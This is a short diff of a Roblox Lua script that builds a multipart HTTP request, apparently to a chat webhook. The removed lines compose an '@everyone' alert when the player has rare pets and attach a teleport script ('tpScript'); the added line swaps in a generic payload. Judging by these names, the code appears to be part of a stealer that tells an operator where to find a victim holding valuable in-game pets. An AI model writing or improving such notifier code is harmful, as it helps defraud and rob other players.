@@ -497,10 +497,7 @@ end
 local boundary = "------------------------" .. HttpService:GenerateGUID(false)
 
 -- Prepare embed JSON
-local embedPayload = HttpService:JSONEncode({
-    content = (hasRarePets() and "--@everyone\n" or "") .. string.format("\n%s\n", tpScript or "N/A"),
-    embeds = {embed}
-})
+local embedPayload = HttpService:JSONEncode(payload)
 
 -- Create multipart body
 local body = {}
@@ -531,6 +528,7 @@ pcall(function()
         Body = requestBody
     })
 end)
+
 
 
 
